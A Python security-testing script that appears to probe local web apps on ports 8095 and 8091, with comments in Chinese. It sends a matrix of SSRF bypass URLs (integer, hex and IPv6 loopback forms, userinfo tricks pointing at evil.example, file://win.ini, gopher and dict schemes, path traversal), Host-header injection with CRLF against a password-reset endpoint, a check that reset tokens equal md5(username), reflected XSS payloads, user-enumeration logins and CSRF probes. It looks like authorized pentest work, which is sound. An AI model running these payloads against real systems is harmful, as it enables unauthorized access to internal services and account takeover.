"""t4-D：SSRF（/fetch + /forgot Host 注入）与 8091 补充面（XSS/枚举/头部）。"""
import json
import os
import sys
import importlib.util as ilu
from urllib.parse import quote

HERE = os.path.dirname(os.path.abspath(__file__))
spec = ilu.spec_from_file_location("hunt_lib", os.path.join(HERE, "hunt-lib.py"))
lib = ilu.module_from_spec(spec)
spec.loader.exec_module(lib)

OUT = os.path.join(HERE, "hunt-d-ssrf-8091-20261012-1850.json")
rec = []
res = []


def add(cat, title, detail, idxs, impact, verdict="见 detail", needs_verify=True,
        port=8095):
    res.append({"id": f"HUNT-D{len(res)+1}", "port": port, "category": cat,
                "title": title, "verdict": verdict, "evidence_indices": idxs,
                "detail": detail, "self_assessed_impact": impact,
                "needs_verifier": needs_verify})


urls = [
    "http://127.0.0.1:8095/",
    "http://127.0.0.1:8095/debug",
    "http://127.0.0.1:8091/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:8100/",
    "http://127.0.0.1:9999/",
    "http://127.0.0.1/",
    "http://localhost:8095/",
    "http://LOCALHOST:8095/",
    "http://0.0.0.0:8095/",
    "http://2130706433:8095/",
    "http://0x7f000001:8095/",
    "http://017700000001:8095/",
    "http://127.1:8095/",
    "http://127.0.0.1.:8095/",
    "http://[::1]:8095/",
    "http://[0:0:0:0:0:0:0:1]:8095/",
    "http://127.0.0.1@evil.example/",
    "http://evil.example@127.0.0.1:8095/",
    "http://127.0.0.1:8095@evil.example/",
    "file:///C:/Windows/win.ini",
    "gopher://127.0.0.1:8095/_GET / HTTP/1.1",
    "dict://127.0.0.1:8095/",
    "http://127.0.0.1:8095/%2e%2e/%2e%2e/app.py",
    "http://127.0.0.1:8095/../../../app.py",
    "http://127.0.0.1:8095/?x=http://127.0.0.1:8095/",
    "https://127.0.0.1:8095/",
    "http://127.0.0.1:8095#@evil.example/",
    "http://127.0.0.1:8095\\@evil.example/",
]
rows = []
for u in urls:
    k = lib.sent(rec, "GET", "/fetch?url=" + quote(u, safe=""),
                 transport_timeout=30, note=f"D1 fetch {u[:60]}")
    r = rec[k]
    ct = [v for kk, v in r["response_headers"] if kk.lower() == "content-type"]
    rows.append({"url": u, "status": lib.get_status(r), "content_type": ct,
                 "idx": k, "len": r["body_len"], "elapsed_ms": r["elapsed_ms"],
                 "snippet": lib.head_text(r, 200)})
add("SSRF", "8095 /fetch?url= SSRF 绕过矩阵（33 组：回环变体/整数与十六进制 IP/跳转凭证/"
    "非 http 协议/路径穿越到 __reset）",
    json.dumps(rows, ensure_ascii=False), [r["idx"] for r in rows],
    "若可用非 127.0.0.1 主机名或非白名单端口读到内容，即 SSRF 校验绕过；"
    "/fetch 还能反向读取 8095 自身与 8091（已白名单，属功能设计）", port=8095)

# /fetch 协议与跳转
r2 = []
for u in ["http://127.0.0.1:8095//evil.example/", "http://127.0.0.1:8095/board",
          "http://127.0.0.1:8095/uploads/ok.txt"]:
    k = lib.sent(rec, "GET", "/fetch?url=" + quote(u, safe=""), transport_timeout=30,
                 note=f"D2 fetch {u}")
    r2.append({"url": u, "status": lib.get_status(rec[k]), "idx": k,
               "snippet": lib.head_text(rec[k], 160)})
add("SSRF", "8095 /fetch 协议内边界（读取自身受保护路径 /board、/uploads）",
    json.dumps(r2, ensure_ascii=False), [x["idx"] for x in r2],
    "确认 SSRF 可达内部路由，作为内网/本地服务探测跳板（受端口白名单限制）",
    needs_verify=False, port=8095)

# ---------------- /forgot Host 注入 + token 可预测 ----------------
fg = []
hosts = ["evil.example", "127.0.0.1:8095", "attacker.test:80", "a\"b<c>",
         "127.0.0.1\r\nX-Injected: 1", "127.0.0.1%0d%0aX-Injected:1"]
for h in hosts:
    k = lib.sent(rec, "GET", "/forgot?username=demo",
                 headers={"X-Forwarded-Host": h}, note=f"D3 forgot XFH={h[:30]!r}")
    r = rec[k]
    fg.append({"xfh": h, "status": lib.get_status(r), "idx": k,
               "reflected": h in r["response_body"],
               "snippet": lib.head_text(r, 220)})
for h in ["evil2.example", "127.0.0.1:8095"]:
    k = lib.sent(rec, "GET", "/forgot?username=demo", headers={"Host": h},
                 note=f"D3 forgot Host={h}")
    fg.append({"host": h, "status": lib.get_status(rec[k]), "idx": k,
               "reflected": h in rec[k]["response_body"],
               "snippet": lib.head_text(rec[k], 220)})
for uname in ["demo", "admin", "alice", "definitely-not-a-user"]:
    k = lib.sent(rec, "GET", "/forgot?username=" + quote(uname),
                 note=f"D3 forgot username={uname}")
    body = rec[k]["response_body"]
    import hashlib
    fg.append({"username": uname, "status": lib.get_status(rec[k]), "idx": k,
               "md5_in_body": hashlib.md5(uname.encode()).hexdigest() in body,
               "snippet": lib.head_text(rec[k], 260)})
add("Host 注入/弱 token", "8095 /forgot：X-Forwarded-Host 与 Host 头注入回显；token=md5(username) 可预测；"
    "对不存在用户同样生成链接",
    json.dumps(fg, ensure_ascii=False), [x["idx"] for x in fg],
    "攻击者可构造指向任意域名的重置链接（钓鱼）；token 可离线预测，"
    "但 /reset 消费端当前 404，无法完成改密链（未验证）", port=8095)

# ---------------- 8091 补充 ----------------
P = 8091
ck = lib.get_cookie("demo", "demo1234", record=rec, port=P, cookie_name="session")
x91 = []
import re as _re
for payload in ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>',
                '<svg/onload=alert(1)>', "'-alert(1)-'"]:
    for tpl in ["/?m={}", "/login?m={}", "/?m=ratelimited&x={}"]:
        k = lib.sent(rec, "GET", tpl.format(quote(payload, safe="")), port=P,
                     note=f"D4 8091 XSS {tpl[:20]}")
        r = rec[k]
        x91.append({"path": tpl.format(payload), "status": lib.get_status(r),
                    "raw": payload in r["response_body"], "idx": k,
                    "snippet": lib.head_text(r, 200)})
add("XSS", "8091 反射探针：首页/登录页 flash 参数 m（12 组）",
    json.dumps(x91, ensure_ascii=False), [x["idx"] for x in x91],
    "flash 参数若未转义即反射型 XSS", port=P)

en = []
for u, pw in [("demo", "wrongpass1234"), ("nosuchuser", "wrongpass1234"),
              ("demo", "demo1234"), ("alice", "alice1234")]:
    r, c = lib.login(u, pw, record=rec, port=P, cookie_name="session")
    en.append({"username": u, "password_kind": "wrong" if pw != u + "1234" else "correct",
               "status": r["status"], "location": r.get("location"),
               "cookie": bool(c), "idx": len(rec) - 1})
add("用户枚举", "8091 登录响应差异（存在用户 vs 不存在用户；失败一律 303 /login?m=bad）",
    json.dumps(en, ensure_ascii=False), [x["idx"] for x in en],
    "若不存在用户与存在用户响应不同即用户名枚举", needs_verify=False, port=P)

hd = []
for path in ["/", "/login", "/profile"]:
    k = lib.sent(rec, "GET", path, port=P,
                 headers={"Cookie": ck} if path == "/profile" else None,
                 note=f"D5 8091 headers {path}")
    h = {kk.lower(): v for kk, v in rec[k]["response_headers"]}
    hd.append({"path": path, "status": lib.get_status(rec[k]), "idx": k,
               "csp": h.get("content-security-policy"),
               "hsts": h.get("strict-transport-security"),
               "xfo": h.get("x-frame-options"), "cto": h.get("x-content-type-options"),
               "set_cookie": h.get("set-cookie")})
add("安全响应头", "8091 响应头基线（CSP/HSTS/XFO/nosniff/Cookie 属性）",
    json.dumps(hd, ensure_ascii=False), [x["idx"] for x in hd],
    "Cookie 缺少 SameSite/Secure 等属性会放大 CSRF 风险", needs_verify=False, port=P)

# 8091 变更密码接口探测（不改真实口令，先测 CSRF 缺失）
cp = []
for body in ["old_password=demo1234&new_password=NewPass12345&csrf_token=x",
             "old_password=demo1234&new_password=NewPass12345"]:
    k = lib.sent(rec, "POST", "/change-password",
                 headers={"Cookie": ck, "Content-Type": "application/x-www-form-urlencoded"},
                 body=body, port=P, note="D6 8091 change-password CSRF 缺失探测")
    cp.append({"body": body[:60], "status": lib.get_status(rec[k]), "idx": k,
               "snippet": lib.head_text(rec[k], 160)})
add("CSRF", "8091 /change-password 缺失/伪造 CSRF token 的行为（未修改成功口令）",
    json.dumps(cp, ensure_ascii=False), [x["idx"] for x in cp],
    "若伪造 token 仍改密成功即 CSRF 失效；本轮预期为 403", needs_verify=False, port=P)

with open(OUT, "w", encoding="utf-8") as fh:
    json.dump({"generated": lib.now(), "results": res, "raw_entries": rec}, fh,
              ensure_ascii=False, indent=1)
print("WROTE", OUT, "entries", len(rec))
for r in res:
    print("-", r["id"], "|", r["title"][:90])
